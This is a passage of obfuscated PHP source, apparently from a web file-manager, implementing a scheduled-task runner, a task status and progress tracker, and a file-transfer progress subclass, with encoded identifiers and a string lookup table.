$Ğ–¦øôı[1552]) - strtotime($Ğ–¦øôı[1553]); $…Áì÷ŒÁ = time() - strtotime(date($Ğ–¦øôı[1554]) . $Ğ–¦øôı[1555]); $‹Ä—©¿ = $…Áì÷ŒÁ >= $ÜË³šŸ¾ && $…Áì÷ŒÁ <= $ÜË³šŸ¾ + 3600; switch ($€»ÌÖÅ¤[$Ğ–¦øôı[29]]) { case $Ğ–¦øôı[1556]: if (time() - $±Œ¦¢ß < 3600 * 24 * 30) { return !1; } if ($€»ÌÖÅ¤[$Ğ–¦øôı[1556]] == date($Ğ–¦øôı[1557]) && $‹Ä—©¿) { return !0; } break; case $Ğ–¦øôı[1558]: if (time() - $±Œ¦¢ß < 3600 * 24 * 7) { return !1; } $ãğ¨¦ = date($Ğ–¦øôı[1559]) == 0 ? 7 : date($Ğ–¦øôı[1559]); if ($€»ÌÖÅ¤[$Ğ–¦øôı[1558]] == $ãğ¨¦ && $‹Ä—©¿) { return !0; } break; case $Ğ–¦øôı[1551]: if (time() - $±Œ¦¢ß < 3600 * 24) { return !1; } if ($‹Ä—©¿) { return !0; } break; case $Ğ–¦øôı[1560]: if (time() - $±Œ¦¢ß >= floatval($€»ÌÖÅ¤[$Ğ–¦øôı[1560]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ûšƒ¾Ç =& $_SERVER[ÏÒ Ì„]; static $Õè›…æŒ = 0; $¿±ôû²‹ = 300; if (!$Õè›…æŒ) { $Õè›…æŒ = time(); } if (time() - $Õè›…æŒ < $¿±ôû²‹) { return; } $Õè›…æŒ = time(); $ÌÃ¡Òú = Model($ûšƒ¾Ç[507])->db($ûšƒ¾Ç[33]); if ($ÌÃ¡Òú) { $ÌÃ¡Òú->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ûšƒ¾Ç[1561], $ûšƒ¾Ç[1562]); die; } } public static function taskRun($Í†ŠÄŒ¥) { $· üòËØ =& $_SERVER[ÏÒ Ì„]; self::log($· üòËØ[1563] . $Í†ŠÄŒ¥[$· üòËØ[395]] . $· üòËØ[1564] . $Í†ŠÄŒ¥[$· üòËØ[28]] . $· üòËØ[1565] . $Í†ŠÄŒ¥[$· üòËØ[1566]]); Model($· üòËØ[1547])->run($Í†ŠÄŒ¥[$· üòËØ[395]]); $¡××ËÜê = timeFloat(); $Ù–¯¬€ = $· üòËØ[33]; switch ($Í†ŠÄŒ¥[$· üòËØ[29]]) { case $· üòËØ[305]: $­éïè² = url_request($Í†ŠÄŒ¥[$· üòËØ[1566]], $· üòËØ[228], !1, !1, !1, !1, 10); if ($­éïè²[$· üòËØ[740]]) { $Ù–¯¬€ = strlen($­éïè²[$· üòËØ[1121]]); } break; case $· üòËØ[227]: $Ù–¯¬€ = Hook::apply($Í†ŠÄŒ¥[$· üòËØ[1566]]); default: break; } Model($· üòËØ[1567])->add(array($· üòËØ[1568] => $· üòËØ[33], $· üòËØ[1569] => $· üòËØ[191], $· üòËØ[29] => $· üòËØ[1570] . $Í†ŠÄŒ¥[$· üòËØ[395]], $· üòËØ[1571] => json_encode(array($· üòËØ[28] => $Í†ŠÄŒ¥[$· üòËØ[28]], $· üòËØ[1572] => timeFloat() - $¡××ËÜê, $· üòËØ[291] => $Ù–¯¬€)))); $ÈÉà‰´¦ = $Ù–¯¬€ ? $· üòËØ[1573] . $Ù–¯¬€ : $· üòËØ[33]; self::log($· üòËØ[1574] . $Í†ŠÄŒ¥[$· üòËØ[395]] . $· üòËØ[530] . $ÈÉà‰´¦); return !0; } private static function valueGet($€œû®èÀ) { $óßÊßİ =& $_SERVER[ÏÒ Ì„]; $úÉ•ëğ = $óßÊßİ[1575]; $ôÂÙ½‚š = Model($óßÊßİ[427])->get($€œû®èÀ, $úÉ•ëğ); if (is_null($ôÂÙ½‚š)) { Model($óßÊßİ[427])->set($óßÊßİ[740], $óßÊßİ[87], $úÉ•ëğ); Model($óßÊßİ[427])->set($óßÊßİ[1538], $óßÊßİ[191], $úÉ•ëğ); $ôÂÙ½‚š = Model($óßÊßİ[427])->get($€œû®èÀ, $úÉ•ëğ); } return $ôÂÙ½‚š; } private static function valueSet($ò¸ç‰½, $¥šÔ‚È) { $ïçûë‹Ü =& $_SERVER[ÏÒ Ì„]; $“Ë†×úÚ = $ïçûë‹Ü[1576]; CacheLock::lock($“Ë†×úÚ); $¢À½šı… = Model($ïçûë‹Ü[427])->set($ò¸ç‰½, $¥šÔ‚È, $ïçûë‹Ü[1575]); CacheLock::unlock($“Ë†×úÚ); return $¢À½šı…; } protected static function log($µ‘š×ø‡) { write_log($µ‘š×ø‡, $_SERVER[ÏÒ Ì„][1562]); } private static function cacheClear() { $ªÆòÈâ =& $_SERVER[ÏÒ Ì„]; Cache::clearMemory(Model($ªÆòÈâ[427])->cacheKey($ªÆòÈâ[1575])); Cache::clearMemory(Model($ªÆòÈâ[427])->cacheKey($ªÆòÈâ[1577])); Model($ªÆòÈâ[1547])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\156\x69\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($áöâ˜Ô, $æ ¬•Á» = '', $ŒËÀò‹ = 0, $§Ï»ÍÓ = '') { $÷çßÍê =& $_SERVER[ÏÒ Ì„]; if (self::get($áöâ˜Ô)) { return; } $this->task = array($÷çßÍê[395] => $áöâ˜Ô, $÷çßÍê[1578] => USER_ID, $÷çßÍê[1478] => $§Ï»ÍÓ, $÷çßÍê[29] => $æ ¬•Á», $÷çßÍê[1059] => $÷çßÍê[33], $÷çßÍê[1057] => $ŒËÀò‹, $÷çßÍê[1579] => 0, $÷çßÍê[1580] => 0, $÷çßÍê[1581] => 0, $÷çßÍê[779] => timeFloat(), $÷çßÍê[778] => 0, $÷çßÍê[1582] => 0, $÷çßÍê[1583] => 0, $÷çßÍê[1584] => 0, $÷çßÍê[740] => $÷çßÍê[1538]); $GLOBALS[$÷çßÍê[1585]] = 1; Hook::bind($÷çßÍê[1541], array($this, $÷çßÍê[1586])); Hook::bind($÷çßÍê[1587], array($this, $÷çßÍê[1588])); $this->startAfter(); Hook::trigger($÷çßÍê[1589], $this->task); $this->task[$÷çßÍê[1582]] = timeFloat(); } public function end() { $ïÓØŠßÓ =& $_SERVER[ÏÒ Ì„]; if (!$this->task) { return; } if ($this->task[$ïÓØŠßÓ[1582]]) { self::valueSet($this->task[$ïÓØŠßÓ[395]], !1); } $ËèÆ¥¦Ä = timeFloat() - $this->task[$ïÓØŠßÓ[779]]; self::log($ïÓØŠßÓ[1590] . $this->task[$ïÓØŠßÓ[395]] . $ïÓØŠßÓ[1591] . $ËèÆ¥¦Ä . $ïÓØŠßÓ[1592]); Hook::unbind($ïÓØŠßÓ[1541], array($this, $ïÓØŠßÓ[1586])); Hook::unbind($ïÓØŠßÓ[1587], array($this, $ïÓØŠßÓ[1588])); $this->endAfter(); $this->task = !1; } public function update($¬®ƒı‘³ = 0, $²ÁĞŸ = false) { $­ÃğÕØä =& $_SERVER[ÏÒ Ì„]; $ğîÆŒğû =& $this->task; if (!$ğîÆŒğû) { return; } $ğîÆŒğû[$­ÃğÕØä[1579]] += $¬®ƒı‘³; $ğîÆŒğû[$­ÃğÕØä[778]] = timeFloat(); if ($ğîÆŒğû[$­ÃğÕØä[1057]]) { if ($ğîÆŒğû[$­ÃğÕØä[1057]] < $ğîÆŒğû[$­ÃğÕØä[1579]]) { $ğîÆŒğû[$­ÃğÕØä[1057]] = $ğîÆŒğû[$­ÃğÕØä[1579]]; } $£‰›šç = timeFloat() - $ğîÆŒğû[$­ÃğÕØä[779]] - $ğîÆŒğû[$­ÃğÕØä[1583]]; $ğîÆŒğû[$­ÃğÕØä[1580]] = $ğîÆŒğû[$­ÃğÕØä[1579]] / $ğîÆŒğû[$­ÃğÕØä[1057]]; $ğîÆŒğû[$­ÃğÕØä[1581]] = $ğîÆŒğû[$­ÃğÕØä[1579]] / $£‰›šç; if ($ğîÆŒğû[$­ÃğÕØä[1580]] > 0) { $ğîÆŒğû[$­ÃğÕØä[1584]] = $£‰›šç * (1 - $ğîÆŒğû[$­ÃğÕØä[1580]]) / $ğîÆŒğû[$­ÃğÕØä[1580]]; } $ğîÆŒğû[$­ÃğÕØä[1584]] = $ğîÆŒğû[$­ÃğÕØä[1584]] <= 0 ? 0 : $ğîÆŒğû[$­ÃğÕØä[1584]]; } $this->updateAfter(); $É©çÓ¹Ü = 0.2; if (timeFloat() - $ğîÆŒğû[$­ÃğÕØä[1582]] < $É©çÓ¹Ü && !$²ÁĞŸ) { return; } $Ş×º®· = self::get($ğîÆŒğû[$­ÃğÕØä[395]]); $ÖŸûÃé = $Ş×º®·[$­ÃğÕØä[740]]; if ($ÖŸûÃé == self::STATYS_KILL) { $øÔ‹Ô¬Ğ = array($­ÃğÕØä[1593] => LNG($­ÃğÕØä[1594]), $­ÃğÕØä[1119] => !1); Cache::set($­ÃğÕØä[1595] . $this->task[$­ÃğÕØä[395]], $øÔ‹Ô¬Ğ, 30); $this->onKill(); $this->end(); die; } else { if ($ÖŸûÃé == self::STATYS_STOP) { $·ËäÀÛ = 2; $Ş×º®·[$­ÃğÕØä[1583]] += $·ËäÀÛ; self::valueSet($ğîÆŒğû[$­ÃğÕØä[395]], $Ş×º®·); sleep($·ËäÀÛ); $this->update(); return; } } $ğîÆŒğû[$­ÃğÕØä[740]] = $ÖŸûÃé ? $ÖŸûÃé : $ğîÆŒğû[$­ÃğÕØä[740]]; $ğîÆŒğû[$­ÃğÕØä[1583]] = $Ş×º®·[$­ÃğÕØä[1583]] ? $Ş×º®·[$­ÃğÕØä[1583]] : 0; $ğîÆŒğû[$­ÃğÕØä[1582]] = timeFloat(); Hook::trigger($­ÃğÕØä[1596], $ğîÆŒğû); self::valueSet($ğîÆŒğû[$­ÃğÕØä[395]], $ğîÆŒğû); } public function onKillSet($³ëæ•ñ, $³ìÇû“° = array()) { $this->onKillCall = array($³ëæ•ñ, $³ìÇû“°); } public function onKill() { $õÁ·œı³ =& $_SERVER[ÏÒ Ì„]; self::log($õÁ·œı³[1590] . $this->task[$õÁ·œı³[395]] . $õÁ·œı³[1597]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ößİáØä) { $ôŠûËù =& $_SERVER[ÏÒ Ì„]; Cache::set($ôŠûËù[1595] . $this->task[$ôŠûËù[395]], $ößİáØä, 60); return $ößİáØä; } public static function get($×¥‚¦Ï‡) { $ÜÁ“™¿ë =& $_SERVER[ÏÒ Ì„]; $Í’İ‘ÇÜ = self::valueGet($×¥‚¦Ï‡); if (is_array($Í’İ‘ÇÜ) && $Í’İ‘ÇÜ[$ÜÁ“™¿ë[1598]]) { $ÔÂÛƒ’ = ActionApply($Í’İ‘ÇÜ[$ÜÁ“™¿ë[1598]], array($Í’İ‘ÇÜ)); $Í’İ‘ÇÜ = is_array($ÔÂÛƒ’) ? $ÔÂÛƒ’ : $Í’İ‘ÇÜ; } return $Í’İ‘ÇÜ; } public static function listData() { $ûÇÇâ = self::valueGet(); return array_sort_by($ûÇÇâ, $_SERVER[ÏÒ Ì„][779], !0); } public static function kill($ÉÇ¶¡»Â) { return self::changeStatus($ÉÇ¶¡»Â, self::STATYS_KILL); } public static function stop($İä‰ª–ı) { return self::changeStatus($İä‰ª–ı, self::STATYS_STOP); } public static function restart($³Â­‚İş) { return self::changeStatus($³Â­‚İş, self::STATYS_RUNNING); } public static function killAll() { $ºÛù¦ ò =& $_SERVER[ÏÒ Ì„]; $£‡¦âÈ = self::listData(); foreach ($£‡¦âÈ as $À•¤®ªÃ) { self::kill($À•¤®ªÃ[$ºÛù¦ ò[395]]); } sleep(2); foreach ($£‡¦âÈ as $À•¤®ªÃ) { self::valueSet($À•¤®ªÃ[$ºÛù¦ ò[395]], !1); } } private static function changeStatus($Ñ”ŠÇñš, $¿¾÷êÈ) { $°ô åš¤ =& $_SERVER[ÏÒ Ì„]; $‚¼Õà¡ = self::valueGet($Ñ”ŠÇñš); if (!$‚¼Õà¡) { return !1; } $‚¼Õà¡[$°ô åš¤[740]] = $¿¾÷êÈ; self::valueSet($Ñ”ŠÇñš, $‚¼Õà¡); self::log($°ô åš¤[1599] . $‚¼Õà¡[$°ô åš¤[395]] . $°ô åš¤[1600] . $¿¾÷êÈ); return !0; } public static function valueGet($Ë¢İû = false) { $¸•Õä‰› =& $_SERVER[ÏÒ Ì„]; if ($Ë¢İû) { $Ğê™¶ÛÙ = Model($¸•Õä‰›[439])->where(array($¸•Õä‰›[93] => $Ë¢İû, $¸•Õä‰›[29] => $¸•Õä‰›[1601]))->find(); return $Ğê™¶ÛÙ ? json_decode($Ğê™¶ÛÙ[$¸•Õä‰›[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($„‘ğÃáÈ = false) { $å–ô¸Ê =& $_SERVER[ÏÒ Ì„]; $äÖ‰¯Ü¤ = array($å–ô¸Ê[29] => $å–ô¸Ê[1601]); if ($„‘ğÃáÈ) { $äÖ‰¯Ü¤[$å–ô¸Ê[1578]] = $„‘ğÃáÈ; } $™´š’…æ = Model($å–ô¸Ê[439])->where($äÖ‰¯Ü¤)->select(); $™´š’…æ = $™´š’…æ ? $™´š’…æ : array(); foreach ($™´š’…æ as $‰ı±€ìğ => $Àı¦©½Â) { $™´š’…æ[$‰ı±€ìğ] = json_decode($Àı¦©½Â[$å–ô¸Ê[372]], !0); } return $™´š’…æ; } public static function valueSet($æš·áê, $Ş¿ÍÂ) { $ €óªâ­ =& $_SERVER[ÏÒ Ì„]; if (!$Ş¿ÍÂ) { return Model($ €óªâ­[439])->where(array($ €óªâ­[93] => $æš·áê, $ €óªâ­[29] => $ €óªâ­[1601]))->delete(); } $¡²Úçª“ = json_encode($Ş¿ÍÂ); if (!$¡²Úçª“) { ob_start(); var_dump($Ş¿ÍÂ); $Ù®Êâ = ob_get_clean(); self::log($ €óªâ­[1602] . json_encode_force($Ù®Êâ)); } if (!$æš·áê || !$Ş¿ÍÂ[$ €óªâ­[395]]) { return !1; } $Åö ê÷Õ = array($ €óªâ­[29] => $ €óªâ­[1601], $ €óªâ­[1578] => USER_ID, $ €óªâ­[93] => $æš·áê, $ €óªâ­[372] => $¡²Úçª“); $Ğ¼’ä½” = $ €óªâ­[1603]; CacheLock::lock($Ğ¼’ä½”); Model($ €óªâ­[439])->add($Åö ê÷Õ, array(), !0); CacheLock::unlock($Ğ¼’ä½”); } public static function log($™“Æ‰«’) { if (!GLOBAL_DEBUG) { return; } write_log($™“Æ‰«’, $_SERVER[ÏÒ Ì„][1604]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ó’î¦Ğ =& $_SERVER[ÏÒ Ì„]; $ÏØõª‹™ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ó’î¦Ğ[1605], array($this, $Ó’î¦Ğ[1606])); Hook::bind($Ó’î¦Ğ[1143], array($this, $Ó’î¦Ğ[1607])); Hook::bind($Ó’î¦Ğ[1608], array($this, $Ó’î¦Ğ[1609])); Hook::bind($Ó’î¦Ğ[592], array($this, $Ó’î¦Ğ[1610])); Hook::bind($Ó’î¦Ğ[593], array($this, $Ó’î¦Ğ[1611])); Hook::bind($Ó’î¦Ğ[595], array($this, $Ó’î¦Ğ[1612])); Hook::bind($Ó’î¦Ğ[596], array($this, $Ó’î¦Ğ[1612])); Hook::bind($Ó’î¦Ğ[562], array($this, $Ó’î¦Ğ[1613])); Hook::bind($Ó’î¦Ğ[559], array($this, $Ó’î¦Ğ[1613])); Hook::bind($Ó’î¦Ğ[564], array($this, $Ó’î¦Ğ[1613])); Hook::bind($Ó’î¦Ğ[566], array($this, $Ó’î¦Ğ[1613])); Hook::bind($Ó’î¦Ğ[568], array($this, $Ó’î¦Ğ[1613])); Hook::bind($Ó’î¦Ğ[1614], array($this, $Ó’î¦Ğ[1615])); Hook::bind($Ó’î¦Ğ[585], array($this, $Ó’î¦Ğ[1616])); $this->sourceModelCopyFlag = !1; Hook::bind($Ó’î¦Ğ[1617], array($this, $Ó’î¦Ğ[1618])); Hook::bind($Ó’î¦Ğ[1619], array($this, $Ó’î¦Ğ[1620])); Hook::bind($Ó’î¦Ğ[1621], array($this, $Ó’î¦Ğ[1622])); $ÏØõª‹™[$Ó’î¦Ğ[1623]] = LNG($Ó’î¦Ğ[1624]); $ÏØõª‹™[$Ó’î¦Ğ[1625]] = 0; $ÏØõª‹™[$Ó’î¦Ğ[1626]] = 0; $ÏØõª‹™[$Ó’î¦Ğ[1059]] = $Ó’î¦Ğ[33]; $ÏØõª‹™[$Ó’î¦Ğ[1627]] = $Ó’î¦Ğ[33]; $ÏØõª‹™[$Ó’î¦Ğ[1628]] = 0; $ÏØõª‹™[$Ó’î¦Ğ[1629]] = 0; $ÏØõª‹™[$Ó’î¦Ğ[1630]] = 0; if (!$ÏØõª‹™[$Ó’î¦Ğ[1478]]) { $ÏØõª‹™[$Ó’î¦Ğ[1478]] = LNG($Ó’î¦Ğ[1631]); } } protected function endAfter() { $Ñ£Ñ×°Ò =& $_SERVER[ÏÒ Ì„]; Hook::unbind($Ñ£Ñ×°Ò[1605], array($this, $Ñ£Ñ×°Ò[1606])); Hook::unbind($Ñ£Ñ×°Ò[1143], array($this, $Ñ£Ñ×°Ò[1607])); Hook::unbind($Ñ£Ñ×°Ò[1608], array($this, $Ñ£Ñ×°Ò[1609])); Hook::unbind($Ñ£Ñ×°Ò[592], array($this, $Ñ£Ñ×°Ò[1610])); Hook::unbind($Ñ£Ñ×°Ò[593], array($this, $Ñ£Ñ×°Ò[1611])); Hook::unbind($Ñ£Ñ×°Ò[595], array($this, $Ñ£Ñ×°Ò[1612])); Hook::unbind($Ñ£Ñ×°Ò[596], array($this, $Ñ£Ñ×°Ò[1612])); Hook::unbind($Ñ£Ñ×°Ò[562], array($this, $Ñ£Ñ×°Ò[1613])); Hook::unbind($Ñ£Ñ×°Ò[559], array($this, $Ñ£Ñ×°Ò[1613])); Hook::unbind($Ñ£Ñ×°Ò[564], array($this, $Ñ£Ñ×°Ò[1613])); Hook::unbind($Ñ£Ñ×°Ò[566], array($this, $Ñ£Ñ×°Ò[1613])); Hook::unbind($Ñ£Ñ×°Ò[568], array($this, $Ñ£Ñ×°Ò[1613])); Hook::unbind($Ñ£Ñ×°Ò[1614], array($this, $Ñ£Ñ×°Ò[1615])); Hook::unbind($Ñ£Ñ×°Ò[585], array($this, $Ñ£Ñ×°Ò[1616])); Hook::unbind($Ñ£Ñ×°Ò[1617], array($this, $Ñ£Ñ×°Ò[1618])); Hook::unbind($Ñ£Ñ×°Ò[1619], array($this, $Ñ£Ñ×°Ò[1620])); Hook::unbind($Ñ£Ñ×°Ò[1621], array($this, $Ñ£Ñ×°Ò[1622])); } public function copyMoveStart($£±æ’·‡, $çù§“ç´, $ÓêÂÚà, $çŒ™ó) { $ôÑÑ­îÈ =& $_SERVER[ÏÒ Ì„]; self::log($ôÑÑ­îÈ[1632] . $çù§“ç´ . $ôÑÑ­îÈ[67] . $çŒ™ó); $ï§„ĞÉ¼ = rtrim(TEMP_FILES, $ôÑÑ­îÈ[8]); if (substr($çù§“ç´, 0, strlen($ï§„ĞÉ¼)) == $ï§„ĞÉ¼) { return; } if (substr($çŒ™ó, 0, strlen($ï§„ĞÉ¼)) == $ï§„ĞÉ¼) { return; } $ Å¶É²« =& $this->task; $ Å¶É²«[$ôÑÑ­îÈ[1633]] = KodIO::transferType($£±æ’·‡, $ÓêÂÚà); $this->update(); } public function updateAfter() { $°ÕÍ¿ºá =& $_SERVER[ÏÒ Ì„]; $ÎÙóŸÆ =& $this->task; if (!$ÎÙóŸÆ[$°ÕÍ¿ºá[753]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÎÙóŸÆ[$°ÕÍ¿ºá[1633]] == $°ÕÍ¿ºá[1228]) { return; } self::updateTask($ÎÙóŸÆ); } private static function updateTask(&$‘Œ¼î±Á) { $ÚğƒíÉ¾ =& $_SERVER[ÏÒ Ì„]; if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1633]] == $ÚğƒíÉ¾[1127] || $‘Œ¼î±Á[$ÚğƒíÉ¾[1633]] == $ÚğƒíÉ¾[107]) { if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1627]]) { $‘Œ¼î±Á[$ÚğƒíÉ¾[1630]] = $‘Œ¼î±Á[$ÚğƒíÉ¾[1629]] + $‘Œ¼î±Á[$ÚğƒíÉ¾[1626]]; } } else { if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1633]] == $ÚğƒíÉ¾[1229]) { if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1627]] == $ÚğƒíÉ¾[1127]) { $‘Œ¼î±Á[$ÚğƒíÉ¾[1630]] = $‘Œ¼î±Á[$ÚğƒíÉ¾[1629]] + $‘Œ¼î±Á[$ÚğƒíÉ¾[1626]] * 0.5; } else { if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1627]] == $ÚğƒíÉ¾[107]) { $‘Œ¼î±Á[$ÚğƒíÉ¾[1630]] = $‘Œ¼î±Á[$ÚğƒíÉ¾[1629]] + $‘Œ¼î±Á[$ÚğƒíÉ¾[1625]] * 0.5 + $‘Œ¼î±Á[$ÚğƒíÉ¾[1626]] * 0.5; } } } } $‘Œ¼î±Á[$ÚğƒíÉ¾[1580]] = $‘Œ¼î±Á[$ÚğƒíÉ¾[1630]] / $‘Œ¼î±Á[$ÚğƒíÉ¾[753]]; if ($‘Œ¼î±Á[$ÚğƒíÉ¾[1580]] > 0) { $•Ô”êÄ = timeFloat() - $‘Œ¼î±Á[$ÚğƒíÉ¾[779]] - $‘Œ¼î±Á[$ÚğƒíÉ¾[1583]]; $‘Œ¼î±Á[$ÚğƒíÉ¾[1584]] = $•Ô”êÄ * (1 - $‘Œ¼î±Á[$ÚğƒíÉ¾[1580]]) / $‘Œ¼î±Á[$ÚğƒíÉ¾[1580]]; } } public function addPath($«‚×Àô·) { $¶–„¸Ò =& $_SERVER[ÏÒ Ì„]; if (!$«‚×Àô·) { return; } $•ºôŠß =& $this->task; $éó¢Ÿ¶Ù = IO::infoWithChildren($«‚×Àô·); $¿›Ï†Ï = $•ºôŠß[$¶–„¸Ò[1634]] ? $•ºôŠß[$¶–„¸Ò[1634]][$¶–„¸Ò[1635]] : 0; $•ºôŠß[$¶–„¸Ò[1634]] = array($¶–„¸Ò[1635] => $¿›Ï†Ï + 1, $¶–„¸Ò[415] => $éó¢Ÿ¶Ù[$¶–„¸Ò[28]], $¶–„¸Ò[76] => $éó¢Ÿ¶Ù[$¶–„¸Ò[76]], $¶–„¸Ò[513] => $éó¢Ÿ¶Ù[$¶–„¸Ò[513]] ? $éó¢Ÿ¶Ù[$¶–„¸Ò[513]] : $éó¢Ÿ¶Ù[$¶–„¸Ò[76]]); if ($éó¢Ÿ¶Ù[$¶–„¸Ò[29]] == $¶–„¸Ò[193]) { $•ºôŠß[$¶–„¸Ò[1057]] += 1; } else { $•ºôŠß[$¶–„¸Ò[1057]] += $éó¢Ÿ¶Ù[$¶–„¸Ò[81]][$¶–„¸Ò[79]]; if ($éó¢Ÿ¶Ù[$¶–„¸Ò[397]]) { $•ºôŠß[$¶–„¸Ò[1057]] += $éó¢Ÿ¶Ù[$¶–„¸Ò[81]][$¶–„¸Ò[80]] + 1; } } $•ºôŠß[$¶–„¸Ò[753]] += $éó¢Ÿ¶Ù[$¶–„¸Ò[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($ÑÎıÜÔ) { $ÊİŸÎÁ‡ =& $_SERVER[ÏÒ Ì„]; $Íù—Ôğ¯ =& $this->task; $Íù—Ôğ¯[$ÊİŸÎÁ‡[1623]] = $ÑÎıÜÔ[$ÊİŸÎÁ‡[28]]; $Íù—Ôğ¯[$ÊİŸÎÁ‡[1059]] = $ÑÎıÜÔ[$ÊİŸÎÁ‡[28]]; $this->update(); } public function copyFileStart($ã¬ĞŞß­, $ááªã‹ü, $ÙÃÍö, $×²‹Ôá, $¤®£¢ê‰, $îÚ©»“€) { $İ×æÖòò =& $_SERVER[ÏÒ Ì„]; $ïŞ±¢ÂÄ = $¤®£¢ê‰; if ($ïŞ±¢ÂÄ == $GLOBALS[$İ×æÖòò[1636]]) { $ïŞ±¢ÂÄ = $GLOBALS[$İ×æÖòò[1637]]; } $GLOBALS[$İ×æÖòò[1637]] = $¤®£¢ê‰; $GLOBALS[$İ×æÖòò[1636]] = $îÚ©»“€; $…ğª‡ŒÄ =& $this->task; $…ğª‡ŒÄ[$İ×æÖòò[1623]] = $ïŞ±¢ÂÄ; $…ğª‡ŒÄ[$İ×æÖòò[1625]] = (int) $ã¬ĞŞß­->size($ááªã‹ü); $…ğª‡ŒÄ[$İ×æÖòò[1626]] = 0; $…ğª‡ŒÄ[$İ×æÖòò[1059]] = $İ×æÖòò[33]; $…ğª‡ŒÄ[$İ×æÖòò[1627]] = $İ×æÖòò[33]; $…ğª‡ŒÄ[$İ×æÖòò[1628]] = 0; $Í§àòĞÚ = $…ğª‡ŒÄ[$İ×æÖòò[1625]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($…ğª‡ŒÄ[$İ×æÖòò[395]] . $İ×æÖòò[1638]); if ($Í§àòĞÚ && file_exists(get_path_father($×²‹Ôá))) { Cache::set($…ğª‡ŒÄ[$İ×æÖòò[395]] . $İ×æÖòò[1638], $×²‹Ôá); $…ğª‡ŒÄ[$İ×æÖòò[1598]] = array($İ×æÖòò[1639], $İ×æÖòò[1640]); } $this->update(0, $Í§àòĞÚ); } public static function updateCopyLocalFileSize($×‹Ö¬Ÿ˜) { $î©Ğ»‚Ì =& $_SERVER[ÏÒ Ì„]; $à”ãí°ç = Cache::get($×‹Ö¬Ÿ˜[$î©Ğ»‚Ì[395]] . $î©Ğ»‚Ì[1638]); if (!$à”ãí°ç || !file_exists($à”ãí°ç)) { return $×‹Ö¬Ÿ˜; } $×‹Ö¬Ÿ˜[$î©Ğ»‚Ì[1626]] = @filesize($à”ãí°ç); $×‹Ö¬Ÿ˜[$î©Ğ»‚Ì[1630]] += $×‹Ö¬Ÿ˜[$î©Ğ»‚Ì[1626]]; self::updateTask($×‹Ö¬Ÿ˜); return $×‹Ö¬Ÿ˜; } public function copyFileEnd($Ú²¥³±, $ÈÑ¹âéÃ, $½×¸ã’˜, $“·¤ò, $Î÷’ÏóÈ, $ºˆãØìß) { $§ö§ı›‘ =& $_SERVER[ÏÒ Ì„]; $Õ’…¾ã© =& $this->task; $Õ’…¾ã©[$§ö§ı›‘[1626]] = $Õ’…¾ã©[$§ö§ı›‘[1625]]; $Õ’…¾ã©[$§ö§ı›‘[1627]] = $§ö§ı›‘[33]; unset($Õ’…¾ã©[$§ö§ı›‘[1598]]); if ($Î÷’ÏóÈ == $Õ’…¾ã©[$§ö§ı›‘[1623]]) { $Õ’…¾ã©[$§ö§ı›‘[1629]] += $Õ’…¾ã©[$§ö§ı›‘[1625]]; $Õ’…¾ã©[$§ö§ı›‘[1630]] = $Õ’…¾ã©[$§ö§ı›‘[1629]]; $this->update(1); } else { $this->update(); $Õ’…¾ã©[$§ö§ı›‘[1626]] = 0; } Cache::remove($Õ’…¾ã©[$§ö§ı›‘[395]] . $§ö§ı›‘[1638]); self::log($§ö§ı›‘[1641] . $ÈÑ¹âéÃ . $§ö§ı›‘[67] . $“·¤ò . $§ö§ı›‘[229] . $Î÷’ÏóÈ . $§ö§ı›‘[1642] . $Õ’…¾ã©[$§ö§ı›‘[1623]]); } public function updateFileEnd($ª–Äãõ, $¬¨í‰Ë•) { $•¥½€ =& $_SERVER[ÏÒ Ì„]; $¦Šğ×»µ =& $this->task; $¦Šğ×»µ[$•¥½€[1623]] = $ª–Äãõ; $¦Šğ×»µ[$•¥½€[1625]] = $¬¨í‰Ë•; $¦Šğ×»µ[$•¥½€[1629]] += $¬¨í‰Ë•; $¦Šğ×»µ[$•¥½€[1630]] = $¦Šğ×»µ[$•¥½€[1629]]; $this->update(1); self::log($•¥½€[1643] . $ª–Äãõ); } public function sourceModelCopy($ÁÄÎÊÒ) { $¡€¦¿õŒ =& $_SERVER[ÏÒ Ì„]; $¿û¬‹Î„ = $ÁÄÎÊÒ[0]; $óÂöËª˜ = $ÁÄÎÊÒ[1]; $øˆ‡íœ =& $this->task; $this->sourceModelCopyFlag = !0; $»ó±öì¨ = 0; switch ($¿û¬‹Î„) { case $¡€¦¿õŒ[560]: $»ó±öì¨ = 1; break; case $¡€¦¿õŒ[563]: $øˆ‡íœ[$¡€¦¿õŒ[1623]] = $óÂöËª˜[$¡€¦¿õŒ[28]]; break; case $¡€¦¿õŒ[565]: $»ó±öì¨ = intval($ÁÄÎÊÒ[$¡€¦¿õŒ[378]] * 0.4); break; case $¡€¦¿õŒ[567]: $»ó±öì¨ = intval($ÁÄÎÊÒ[$¡€¦¿õŒ[378]] * 0.2); break; case $¡€¦¿õŒ[569]: $»ó±öì¨ = intval($ÁÄÎÊÒ[$¡€¦¿õŒ[378]] * 0.4); break; } $this->update($»ó±öì¨); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¬°ÚÅ¯×, $¾•–ÂĞ¨) { $ÏËŸ´ç¾ =& $_SERVER[ÏÒ Ì„]; $this->sourceModelCopyFlag = !0; $¾•ëßóç = 1; if (isset($¬°ÚÅ¯×[$ÏËŸ´ç¾[81]])) { $¾•ëßóç = 